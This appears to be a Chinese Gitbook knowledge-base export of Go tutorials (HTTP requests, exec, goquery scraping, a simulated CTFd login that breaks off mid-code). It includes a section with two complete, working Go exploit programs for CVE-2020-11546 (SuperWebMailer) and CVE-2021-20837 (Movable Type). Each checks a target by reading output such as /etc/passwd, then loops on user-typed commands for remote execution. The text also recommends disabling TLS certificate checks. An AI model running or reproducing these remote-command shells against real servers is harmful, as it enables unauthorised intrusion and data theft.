伪随机生成的数字是确定的，不论在什么机器、什么时间，只要执行的随机代码一样，那么生成的随机数就一样 package main import ( \"fmt\" \"math/rand\" ) func main() { p := fmt.Println p(rand.Int()) // 5577006791947779410 p(rand.Int31n(int32(60))) // 27 for i:=0; i 真随机数 crypto/rand是为了提供更好的随机性满足密码对随机数的要求，在linux上已经有一个实现就是/dev/urandom，crypto/rand就是从这个地方读“真随机”数字返回，但性能比较慢 package main import ( \"crypto/rand\" \"math/big\" ) func main() { for i := 0; i URL解析 可以直接使用url.Parse(string u)来解析，其中包括方案，身份验证信息，主机，端口，路径，查询参数和查询片段等信息 package main import ( \"fmt\" \"net/url\" ) func main() { u := \"https://admin:password@blog.gm7.org/test/point?a=123&b=test\" uu, _ := url.Parse(u) fmt.Println(uu.Scheme) fmt.Println(uu.User) fmt.Println(uu.User.Username()) fmt.Println(uu.Host) fmt.Println(uu.Path) fmt.Println(uu.Hostname()) fmt.Println(uu.Query()) } /* https admin:password admin blog.gm7.org /test/point blog.gm7.org map[a:[123] b:[test]] */ Base64 package main import ( \"encoding/base64\" \"fmt\" ) func main() { a := \"123456\" res := base64.StdEncoding.EncodeToString([] byte(a)) fmt.Println(res) // MTIzNDU2 decod, _ := base64.StdEncoding.DecodeString(res) fmt.Println(string(decod)) // 123456 } 命令行参数 从命令行获取参数，得到的是一个切片 package main import ( \"fmt\" \"os\" ) func main() { args := os.Args fmt.Println(args) } /* go run Hello.go 123 456 [/var/folders/fw/tddtsjp91wb9q64l5xt7jd540000gn/T/go-build3185553057/b001/exe/Hello 123 456] */ 执行系统命令 在 Golang 中用于执行命令的库是 os/exec，exec.Command 函数返回一个 Cmd 对象，根据不同的需求，可以将命令的执行分为三种情况 只执行命令，不获取结果 执行命令，并获取结果（不区分 stdout 和 stderr） 执行命令，并获取结果（区分 stdout 和 stderr） 只执行命令，不获取结果 直接调用Run()函数 package main import ( \"fmt\" \"os/exec\" ) func main() { res := exec.Command(\"open\", \"-na\", \"Calculator\").Run() // run会阻塞等到命令执行结束 fmt.Println(res) // } 执行命令获取结果 可以调用 cmd 的 CombinedOutput 函数 package main import ( \"fmt\" \"os/exec\" ) func main() { cmd := exec.Command(\"ls\", \"-la\") res, _ := cmd.CombinedOutput() fmt.Println(string(res)) // ls -la 执行结果 } 执行命令获取结果并区分stdout和stderr package main import ( \"bytes\" \"fmt\" \"os/exec\" ) func main() { cmd := exec.Command(\"ls\", \"-la\") var stdout, stderr bytes.Buffer cmd.Stdout = &stdout cmd.Stderr = &stderr cmd.Run() fmt.Println(string(stdout.Bytes())) // ls -la 执行结果 } 多条命令使用管道执行 就是类似shell里面|的作用，ls -la | grep go package main import ( \"fmt\" \"os\" \"os/exec\" ) func main() { cmd1 := exec.Command(\"ls\", \"-la\") cmd2 := exec.Command(\"grep\", \"go\") cmd2.Stdin, _ = cmd1.StdoutPipe() cmd2.Stdout = os.Stdout cmd2.Start() cmd1.Run() cmd2.Wait() fmt.Println(cmd2.Stdout) // ls -la | grep go 执行结果 } 扩展 前面每个空格间都需要单独一个参数，有时候很长就不方便，可以采用如下的方式来 cmd := exec.Command(\"/bin/sh\",\"-c\",\"expr 2 + 33\") HTTP请求 快速发起get请求 package main import ( \"fmt\" \"io/ioutil\" \"net/http\" ) func main() { url := \"https://www.baidu.com/\" response,_ := http.Get(url) // 发起get请求 defer response.Body.Close() fmt.Println(response.StatusCode) fmt.Println(response.Header.Get(\"Server\")) body, _ := ioutil.ReadAll(response.Body) fmt.Println(string(body)) // 源码 } 收到的数据包 GET / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Accept-Encoding: gzip 带有参数的GET请求 可以直接在上面的url后面直接构造参数，也可以通过如下的方式手动设置参数 package main import ( \"fmt\" \"net/http\" \"net/url\" ) func main() { u := \"http://baidu.com/\" Url, _ := url.Parse(u) param := url.Values{} param.Set(\"name\", \"d4m1ts\") param.Set(\"中文\", \"汉字测试\") Url.RawQuery = param.Encode() // 包含URL编码 fmt.Println(Url) // http://baidu.com/?name=d4m1ts&%E4%B8%AD%E6%96%87=%E6%B1%89%E5%AD%97%E6%B5%8B%E8%AF%95 resp,_ := http.Get(Url.String()) fmt.Println(resp.StatusCode) // 200 } 收到的数据包 GET /?name=d4m1ts&%E4%B8%AD%E6%96%87=%E6%B1%89%E5%AD%97%E6%B5%8B%E8%AF%95 HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Accept-Encoding: gzip 返回JSON的数据包 返回是json格式，如何快速格式化数据 返回的json内容 { \"args\": {}, \"headers\": { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Dnt\": \"1\", \"Host\": \"httpbin.org\", \"Sec-Gpc\": \"1\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\", \"X-Amzn-Trace-Id\": \"Root=1-61cbb6de-6e8a5d6a2710be6f22da6f92\" }, \"origin\": \"213.239.21.35\", \"url\": \"http://httpbin.org/get\" } 一样的发起http请求，只是最后用JSON来反序列化而已 package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" \"io/ioutil\" \"net/http\" ) func main() { u := \"http://httpbin.org/get\" resp, err := http.Get(u) if err == nil { // 请求成功 body, _ := ioutil.ReadAll(resp.Body) origin := jsoniter.Get(body, \"origin\") fmt.Println(origin.ToString()) // 213.239.21.35 headers := jsoniter.Get(body, \"headers\") fmt.Println(headers.Get(\"Host\").ToString()) // httpbin.org } } 自定义Header头 package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" \"io/ioutil\" \"net/http\" \"time\" ) func main() { // 创建一个HTTP请求，但是不发送请求 u := \"http://httpbin.org/get\" req, _ := http.NewRequest(\"GET\", u, nil) req.Header.Set(\"User-Agent\", \"Test GO\") req.Header.Set(\"Name\", \"d4m1ts\") // 发送刚才创建的请求 client := http.Client{ Timeout: 3*time.Second, // 超时时间 } resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) headers := jsoniter.Get(body, \"headers\") fmt.Println(headers.ToString()) } /* { \"Accept-Encoding\": \"gzip\", \"Host\": \"httpbin.org\", \"Name\": \"d4m1ts\", \"User-Agent\": \"Test GO\", \"X-Amzn-Trace-Id\": \"Root=1-61cbbb0d-68f21a6c5c36abd861b6fe99\" } */ 收到的数据包 GET / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Test GO Name: d4m1ts Accept-Encoding: gzip 快速发起POST请求 方法一：使用http.Post，有一点点麻烦 package main import ( \"net/http\" \"strings\" ) func main() { u := \"http://127.0.0.1:8000\" http.Post(u, \"application/x-www-form-urlencoded\", strings.NewReader(\"aa=bb\")) } 收到的http请求 POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Content-Length: 5 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip aa=bb 方法二：使用http.PostForm，相对简单，但是无法设置content-type，没那么自由 package main import ( \"net/http\" \"net/url\" ) func main() { u := \"http://127.0.0.1:8000\" param := url.Values{} param.Set(\"aaa\", \"bbb\") http.PostForm(u, param) } 收到的http请求 POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Content-Length: 7 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip aaa=bbb 自定义POST请求 和get差不多，只不过是多了设置content-type和post数据的步骤而已 举例为发送json数据 package main import ( \"bytes\" \"encoding/json\" \"net/http\" ) func main() { // 创建请求，但是不发起 u := \"http://127.0.0.1:8000\" param := map[string]string{ \"aa\": \"bb\", \"name\": \"d4m1ts\", } buf, _ := json.Marshal(param) // 序列化的json req, _ := http.NewRequest(\"POST\", u, bytes.NewReader(buf)) req.Header.Set(\"User-Agent\", \"UA TEST\") req.Header.Set(\"Content-Type\", \"application/json\") // 发送刚才的请求 client := http.Client{} client.Do(req) } 收到的http数据包 POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: UA TEST Content-Length: 27 Content-Type: application/json Accept-Encoding: gzip {\"aa\":\"bb\",\"name\":\"d4m1ts\"} 忽略证书 有些时候一些ssl网站因为证书问题也会抛出panic异常，所以一般可以忽略SSL证书，在初始化http客户端的时候忽略，代码如下 tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client := http.Client{ Transport: tr, } cookieJar和代理设置 // 初始化Client jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) proxy,_ := url.Parse(\"socks5://127.0.0.1:1080\") netTransport := &http.Transport{ Proxy: http.ProxyURL(proxy), MaxIdleConnsPerHost: 10, ResponseHeaderTimeout: time.Second * time.Duration(5), } Client = http.Client{ Transport: netTransport, Jar: jar, Timeout: time.Second * 10, } Client.Get(\"http://cip.cc\") gzip解压 有些返回的数据是二进制乱码的，这个时候我们就需要进行gzip解压 resp, _ := Client.Do(req) reader,_ := gzip.NewReader(resp.Body) source, _ := ioutil.ReadAll(reader) fmt.Println(string(source)) go flag 这个库主要用来判断工具命令行传入的参数用的 虽然go有os.Args，但是不如这个好用 演示： func main() { var filePath string flag.StringVar(&filePath, \"file\", \"\", \"markdown文件路径\") flag.Parse() if flag.Lookup(\"file\").DefValue == flag.Lookup(\"file\").Value.String() { // 避免使用默认参数，所以加个判断 flag.Usage() } if flag.NFlag() == 0 { // 使用的命令行参数个数，这个地方可以用来判断用户是否输入参数（程序正常情况下会使用默认参数） flag.Usage() os.Exit(0) } } [!NOTE] 还有一些其他的参数，可以自己研究下，基本上看到名字就知道啥意思，主要用的就上面那些 如果觉得帮助不好看，可以重写flag.Usage()这个方法 flag.Usage = func() { fmt.Fprintf(flag.CommandLine.Output(), \"markdown图片自动上传到图床\\nUsage of %s:\\n\", os.Args[0]) flag.PrintDefaults() } 颜色输出 最简单的版本 package main import \"fmt\" func main() { fmt.Printf(\"\\033[1;31;40m%s\\033[0m\\n\",\"Red.\") fmt.Printf(\"\\033[1;37;41m%s\\033[0m\\n\",\"Red.\") } 输出所有颜色 package main import \"fmt\" func main() { for b := 40; b 但是每一次都这样很难记住，所以已经有人给他封装成了一个包：https://github.com/fatih/color，可以快速看下它的说明文档 实例： package main import ( \"github.com/fatih/color\" ) func main() { color.Blue(\"aaaa%scccc\", \"bbb\") color.Red(\"red red\") color.Magenta(\"And many others ..\") } 参考 Golang标准库文档 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-31 14:45:10 "},"个人知识库/03.编程开发/GO/02.GO实例/02.使用GO编写POC.html":{"url":"个人知识库/03.编程开发/GO/02.GO实例/02.使用GO编写POC.html","title":"02.使用GO编写POC","keywords":"","body":" CVE-2020-11546 扩展1：交叉编译 扩展2：go.mod 扩展3：go get 扩展4：交互输入 代码 测试图 CVE-2021-20837 扩展5：忽略SSL证书 扩展6：正则表达式 代码 测试图 CVE-2020-11546 [!NOTE] 已上传至GitHub:https://github.com/damit5/CVE-2020-11546 扩展1：交叉编译 CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_darwin CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_linux CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_win.exe 扩展2：go.mod go mod init go mod init github.com/damit5/CVE-2020-11546 不然不能go get -u自动下载编译，会出现问题 扩展3：go get 直接使用go get -u github.com/xxx可能出现版本的问题，可以使用如下命令执行版本或者分支 go get -u -v github.com/damit5/CVE-2020-11546@master [!TIP] 也可以使用@commit hash等等 http://icattlecoder.github.io/2019/03/29/go-module-and-version.html https://zhuanlan.zhihu.com/p/103534192 扩展4：交互输入 for { fmt.Printf(\"\\n\\ncommand: \") _, _ = fmt.Scanln(&command) if command != \"\" { break } } 代码 package main import ( \"bytes\" \"fmt\" \"io/ioutil\" \"net/http\" \"os\" \"strings\" ) func banner(){ fmt.Println(` .___ _____ ____ __ __| _// | | _____/_ |/ |_ ______ / __ |/ | |_/ \\| \\ __\\/ ___/ / /_/ / ^ / Y Y \\ || | \\___ \\ \\____ \\____ ||__|_| /___||__| /____ > \\/ |__| \\/ \\/ CVE-2020-11546 `) } /* * 参数检查 */ func argsCheck(args []string) { if len(args) != 2 { fmt.Printf(\"Usage:\\n\\t./%s \\n\", args[0]) os.Exit(0) } } /* * url处理 */ func urlHandler(target string) string { // 没有http前缀的添加http前缀 if !strings.HasPrefix(target, \"http\") { target = \"http://\" + target } // 有/结尾的就去掉/ if strings.HasSuffix(target, \"/\") { // 去掉后缀 / target = strings.TrimSuffix(target, \"/\") fmt.Println(target) } return target } /* * 漏洞检查 */ func check(target string) bool { // 创建请求 vulurl := target + \"/mailingupgrade.php\" req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(`step=4&Language=de%7b$%7bsystem(%22echo vultest%22)%7d%7d&RegName=12345678901234567890123&RegNumber=12345&NextBtn=Weiter+%3E`))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"application/x-www-form-urlencoded\") // 发起请求 client := http.Client{} resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(body), \"vultest\") { return true } return false } /* * 漏洞检查 */ func exp(target string, command string) { // 创建请求 vulurl := target + \"/mailingupgrade.php\" data := `step=4&Language=de%7b$%7bsystem(%22` + command + `%22)%7d%7d&RegName=12345678901234567890123&RegNumber=12345&NextBtn=Weiter+%3E` req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(data))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"application/x-www-form-urlencoded\") // 发起请求 client := http.Client{} resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) res := strings.Replace(string(body), \"Can't load correct language file in /language directory\", \"\", -1) res = strings.TrimSpace(res) fmt.Println(res) } func main() { args := os.Args banner() argsCheck(args) target := args[1] target = urlHandler(target) if check(target) { fmt.Printf(\"target %s is vuln\", target) var command string for { for { fmt.Printf(\"\\n\\ncommand: \") fmt.Scanln(&command) if command != \"\" { break } } exp(target, command) } } else { fmt.Printf(\"target %s is not vuln\", target) } } 测试图 CVE-2021-20837 扩展5：忽略SSL证书 [!WARNING] 这个错误不容易发现，所以需要经验来判断，在初始化客户端的时候需要忽略SSL证书 var Client http.Client tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client = http.Client{ Transport: tr, } 扩展6：正则表达式 默认情况下，.是不能匹配换行符\\n的，有时候我们有需要通过.匹配到\\n，这个时候就需要稍微修改一下.了 [!TIP] 在线正则表达式测试网站：https://regex101.com/ (?s).* 实例： 代码 package main import ( \"bytes\" \"crypto/tls\" \"encoding/base64\" \"fmt\" \"io/ioutil\" \"net/http\" \"os\" \"regexp\" \"strings\" ) // 客户端全局变量 var Client http.Client func banner(){ fmt.Println(` .___ _____ ____ __ __| _// | | _____/_ |/ |_ ______ / __ |/ | |_/ \\| \\ __\\/ ___/ / /_/ / ^ / Y Y \\ || | \\___ \\ \\____ \\____ ||__|_| /___||__| /____ > \\/ |__| \\/ \\/ CVE-2021-20837 `) } /* * 参数检查 */ func argsCheck(args []string) { if len(args) != 2 { fmt.Printf(\"Usage:\\n\\t./%s \\n\", args[0]) os.Exit(0) } } /* * url处理 */ func urlHandler(target string) string { // 没有http前缀的添加http前缀 if !strings.HasPrefix(target, \"http\") { target = \"http://\" + target } // 有/结尾的就去掉/ if strings.HasSuffix(target, \"/\") { // 去掉后缀 / target = strings.TrimSuffix(target, \"/\") fmt.Println(target) } return target } /* * 漏洞检查 */ func check(target string) bool { // 创建请求 vulurl := target + \"/cgi-bin/mt/mt-xmlrpc.cgi\" command := \"`cat /etc/passwd`\" base64_cmd := base64.StdEncoding.EncodeToString([]byte(command)) payload := fmt.Sprintf(` mt.handler_to_coderef %s `, base64_cmd) req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(payload))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"text/xml; charset=UTF-8\") // 发起请求 tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client = http.Client{ Transport: tr, } resp, _ := Client.Do(req) body, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(body), \"root:x:0\") { return true } return false } /* * 漏洞检查 */ func exp(target string, command string) { // 创建请求 vulurl := target + \"/cgi-bin/mt/mt-xmlrpc.cgi\" base64_cmd := base64.StdEncoding.EncodeToString([]byte(\"`\" + command + \"`\")) payload := fmt.Sprintf(` mt.handler_to_coderef %s `, base64_cmd) req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(payload))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"text/xml; charset=UTF-8\") // 发起请求 resp, _ := Client.Do(req) body, _ := ioutil.ReadAll(resp.Body) // 正则表达式匹配结果 regex, _ := regexp.Compile(\"Can't\\\\slocate\\\\s((?s).*)\\\\sin @INC\") res := regex.FindAllStringSubmatch(string(body), 1)[0][1] fmt.Println(res) } func main() { args := os.Args banner() argsCheck(args) target := args[1] target = urlHandler(target) if check(target) { fmt.Printf(\"target %s is vuln\", target) var command string for { for { fmt.Printf(\"\\n\\ncommand: \") _, _ = fmt.Scanln(&command) if command != \"\" { break } } exp(target, command) } } else { fmt.Printf(\"target %s is not vuln\", target) } } 测试图 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-29 17:44:33 "},"个人知识库/03.编程开发/GO/02.GO实例/03.使用GO模拟登陆.html":{"url":"个人知识库/03.编程开发/GO/02.GO实例/03.使用GO模拟登陆.html","title":"03.使用GO模拟登陆","keywords":"","body":" 前期准备 goquery基础用法 创建document实例 标签选择器 ID选择器 class选择器 属性选择器 内容提取 parent>child子选择器 prev+next相邻选择器 prev~next兄弟选择器 内容过滤器 :first-of-type过滤器 :nth-child(n) 过滤器系列 :only-child 过滤器系列 选择器或(|)运算 补充说明 Cookie自动保存更新 实战 前期准备 本次为了方便解析html，快速提取登陆时需要的一些数据，类似python中的bs4，而不是采用正则表达式去匹配数据，所以会用到一个新的库 goquery：https://github.com/PuerkitoBio/goquery 安装： go get -v github.com/PuerkitoBio/goquery goquery基础用法 [!NOTE] 大部分内容匹配规则和jquery类似 以 https://cloud.ctfd.io/login 页面为例 创建document实例 req, _ := http.NewRequest(\"GET\", \"https://cloud.ctfd.io/login\", nil) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") client := &http.Client{} resp, _ := client.Do(req) // 参数类型为 io.Reader dom, _ := goquery.NewDocumentFromReader(resp.Body) 标签选择器 这个比较简单，就是基于a,p等这些HTML的基本元素进行选择，这种直接使用Element名称作为选择器即可。比如dom.Find(\"div\") 实例：找到所有的a标签，并循环获取值（不是属性，是标签中的值） dom.Find(\"a\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) }) Features Pricing Store Contact Login Sign Up Don't have an account? Sign Up # 和截图匹配的这一条 Forgot password? Exiting. ID选择器 通过ID定位到元素，算是最常用的之一 实例：比如我们要定位到id=\"navbarResponsive\"的元素，输出它的源码，不过需要注意的是，输出源码并不会输出当前的标签 selection := dom.Find(\"#navbarResponsive\") // selection := dom.Find(\"div#navbarResponsive\") // 同时匹配标签和id，更准确 fmt.Println(selection.Html()) Features Pricing Store Contact Login Sign Up class选择器 它的用法和ID选择器类似，为Find(\".class\") 实例：寻找所有class=\"nav-link元素，并输出他们的值 dom.Find(\".nav-link\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) }) [!TIP] 也可以组合，如 a.nav-link：寻找所有a标签且class为nav-link的元素 Features Pricing Store Contact Login Sign Up 属性选择器 上面3种有时候还不够用，这个时候就需要属性选择器来帮忙了 实例：获取input标签中属性name为nonce的元素的value值 [!Note] 就是获取红框中的值，这里放图了下面就不放了 res, exist := dom.Find(\"input[name=nonce]\").Attr(\"value\") if exist { fmt.Println(res) // YidceDA0XHhhZVx4YmE9XHgxNFx4MTVceDhlXHgxNC9ceGUyJw== } 补充： 除了完全相等，还有其他匹配方式，使用方式类似，这里统一列举下，不再举例 选择器 说明 Find(\"div[lang]\") 筛选含有lang属性的div元素 Find(\"div[lang=zh]\") 筛选lang属性为zh的div元素 Find(\"div[lang!=zh]\") 筛选lang属性不等于zh的div元素 Find(\"div[lang¦=zh]\") 筛选lang属性为zh或者zh-开头的div元素 Find(\"div[lang*=zh]\") 筛选lang属性包含zh这个字符串的div元素 Find(\"div[lang~=zh]\") 筛选lang属性包含zh这个单词的div元素，单词以空格分开的 Find(\"div[lang$=zh]\") 筛选lang属性以zh结尾的div元素，区分大小写 Find(\"div[lang^=zh]\") 筛选lang属性以zh开头的div元素，区分大小写 以上是属性筛选器的用法，都是以一个属性筛选器为例，当然你也可以使用多个属性筛选器组合使用，比如： Find(\"div[id][lang=zh]\"),用多个中括号连起来即可。当有多个属性筛选器的时候，要同时满足这些筛选器的元素才能被筛选出来 内容提取 获取到了标签，当然就像获取到里面的值了 parent>child子选择器 [!NOTE] 上面的基本都够用了，这里再列举一些可能会用到的筛选器 如果我们想筛选出某个元素下符合条件的子元素，我们就可以使用子元素筛选器，它的语法为Find(\"parent>child\"),表示筛选parent这个父元素下，符合child这个条件的最直接（一级）的子元素。 实例：form标签下的input标签的属性value的值 res, exist := dom.Find(\"form>input\").Attr(\"value\") if exist { fmt.Println(res) // YiJceGU0YTxceGY3alx4MGYnVVx4ZDdceGNlIg== } prev+next相邻选择器 假设我们要筛选的元素没有规律，但是该元素的上一个元素有规律，我们就可以使用这种下一个相邻选择器来进行选择。 实例：h2标签旁边的p标签的值 [!TIP] 如果class的值存在空格，那么可以用属性的格式来匹配，防止空格影响结果 dom.Find(\"h2[class='block-title text-center']+p.text-center\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) // Don't have an account? Sign Up }) prev~next兄弟选择器 有相邻就有兄弟，兄弟选择器就不一定要求相邻了，只要他们共有一个父元素就可以。 实例：获取lable标签的兄弟标签input dom.Find(\"label~input\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Attr(\"name\")) // email true }) 内容过滤器 有时候我们使用选择器选择出来后，希望再过滤一下，这时候就用到过滤器了 实例：获取包含内容Email的label标签 dom.Find(\"label:contains(Email)\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) // Email Address }) 扩展： Find(\":contains(text)\")表示筛选出的元素要包含指定的文本 Find(\":empty\")表示筛选出的元素都不能有子元素（包括文本元素），只筛选那些不包含任何子元素的元素 Find(\":has(selector)\")和contains差不多，只不过这个是包含的是元素节点 :first-of-type过滤器 :first-child选择器限制的比较死，必须得是第一个子元素，如果该元素前有其他在前面，就不能用:first-child了，这时候:first-of-type就派上用场了，它要求只要是这个类型的第一个就可以 实例：输出第一个div标签的源码 ret, _ := dom.Find(\"div:first-of-type\").Html() fmt.Println(ret) 扩展： :last-child 和 :last-of-type过滤器正好和上面的2歌过滤器相反，表示最后一个过滤器 :nth-child(n) 过滤器系列 表示筛选出的元素是其父元素的第n个元素，n以1开始。所以我们可以知道:first-child和:nth-child(1)是相等的。通过指定n，我们就很灵活的筛选出我们需要的元素 同样，:nth-of-type(n)和 :nth-child(n) 类似，只不过它表示的是同类型元素的第n个,所以:nth-of-type(1) 和 :first-of-type是相等的 nth-last-child(n) 和:nth-last-of-type(n) 过滤器是倒序开始计算的，最后一个元素被当成了第一个 [!WARNING] 都不举例了，没必要 :only-child 过滤器系列 Find(\":only-child\") 过滤器，从字面上看，可以猜测出来，它表示筛选的元素，在其父元素中，只有它自己，它的父元素没有其他子元素，才会被匹配筛选出来。 :only-of-type 过滤器和其他的类似，同类型元素只要只有一个，就可以被筛选出来 选择器或(|)运算 如果我们想同时筛选出div,span等元素怎么办？这时候可以采用多个选择器进行组合使用，并且以逗号(,)分割，Find(\"selector1, selector2, selectorN\")表示，只要满足其中一个选择器就可以被筛选出来，也就是选择器的或(|)运算操作。 实例：筛选出所有的meta标签和input标签，并且获取到其属性name的值 dom.Find(\"meta,input\").Each(func(i int, selection *goquery.Selection) { val, exists := selection.Attr(\"name\") if exists { fmt.Println(val) } }) viewport description author twitter:card twitter:site twitter:creator twitter:title twitter:description twitter:image email password nonce 补充说明 1、类似函数的位置操作 方法 说明 Find(selection) *Selection 根据选择器查找节点集 Eq(index int) *Selection 根据索引获取某个节点集 First() *Selection 获取第一个子节点集 Last() *Selection 获取最后一个子节点集 Next() *Selection 获取下一个兄弟节点集 NextAll() *Selection 获取后面所有兄弟节点集 Prev() *Selection 前一个兄弟节点集 Get(index int) *html.Node 根据索引获取一个节点 Index() int 返回选择对象中第一个元素的位置 Slice(start, end int) *Selection 根据起始位置获取子节点集 2、循环遍历选择的节点 方法 说明 Each(f func(int, *Selection)) *Selection 遍历 EachWithBreak(f func(int, *Selection) bool) *Selection 可中断遍历 Map(f func(int, *Selection) string) (result []string) 返回字符串数组 3、检测或获取节点属性值 方法 说明 Attr(), RemoveAttr(), SetAttr() 获取，移除，设置属性的值 AddClass(), HasClass(), RemoveClass(), ToggleClass() 类相关 Html() 获取该节点的html Length() 返回该Selection的元素个数 Text() 获取该节点的文本值 4、 在文档树之间来回跳转（常用的查找节点方法） 方法 说明 Children() 返回selection中各个节点下的孩子节点 Contents() 获取当前节点下的所有节点 Find() 查找获取当前匹配的元素 Next() 下一个元素 Prev() 上一个元素 Cookie自动保存更新 [!NOTE] 大家都知道，网站登陆后肯定有个用来鉴权的东西，而Cookie和token居多，这里我们讲一下用Cookie [!DANGER] 网上直接搜go模拟登陆，但是出来的代码都是登陆后手动设置req的cookie，而不会自动的更新cookie，既然python里面都有request.Session，那golang里面肯定也有类似的东西吧！ 结合之前的经验，发现在创建客户端的时候，会传入一个CookieJar，这玩意儿根据经验肯定是用来存放Cookie的 试一下便知 根据经验，第一次访问百度的时候，百度会给咱们分配cookie，那咱们就可以用它来试试能不能自动保存更新Cookie 然后根据它的参数构造一个CookieJar出来 jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) 再创建个http客户端给它放进去，发起请求，查看结果 package main import ( \"fmt\" \"golang.org/x/net/publicsuffix\" \"net/http\" \"net/http/cookiejar\" ) func main() { // 创建客户端 jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client := http.Client{Jar: jar} fmt.Printf(\"访问前：\\n\") fmt.Println(client.Jar) client.Get(\"https://www.baidu.com\") fmt.Printf(\"\\n\\n访问后：\\n\") fmt.Println(client.Jar) } 可以看到我们的Cookie成功自动保存了，那就说明之前的猜想是对的 后面对百度发起访问，就会自动带上Cookie了 实战 实战模拟登陆CTFD平台：https://cloud.ctfd.io/login 主要分为3步： 获取nonce 登陆 验证登陆是否成功 完整代码： package main import ( \"fmt\" \"github.com/PuerkitoBio/goquery\" \"golang.org/x/net/publicsuffix\" \"io/ioutil\" \"net/http\" \"net/http/cookiejar\" \"net/url\" \"strings\" ) // 登陆账号密码 var Config = map[string]string{ \"email\": \"yeciyar420@zherben.com\", \"passwd\": \"xxxxx\", } // 登陆客户端 var Client http.Client /* * 1. 获取登陆需要的Nonce，同时初始化客户端 */ func getNonce() string { req, _ := http.NewRequest(\"GET\", \"https://cloud.ctfd.io/login\", nil) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") // 初始化client jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) Client = http.Client{Jar: jar} resp, _ := Client.Do(req) dom, _ := goquery.NewDocumentFromReader(resp.Body) val, _ := dom.Find(\"input[name=nonce]\").Attr(\"value\") return val } /* * 2. 登陆 */ func login(nonce string) (bool) { // 构造请求 param := url.Values{} param.Set(\"email\", Config[\"email\"]) param.Set(\"password\", Config[\"passwd\"]) param.Set(\"nonce\", nonce) data := param.Encode() req, _ := http.NewRequest(\"POST\", \"https://cloud.ctfd.io/login\", strings.NewReader(data)) req.Header.Set(\"authority\", \"cloud.ctfd.io\") req.Header.Set(\"content-type\", \"application/x-www-form-urlencoded\") req.Header.Set(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") req.Header.Set(\"referer\", \"https://cloud.ctfd.io/admin\") // 发起请求 resp, _ := Client.Do(req) source, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(source), \"Your password is wrong\"){ fmt.Println(\"账号或密码错误\") return false } else { return true } } /* * 3. 验证是否登陆成功 */ func getInfo() { req, _ 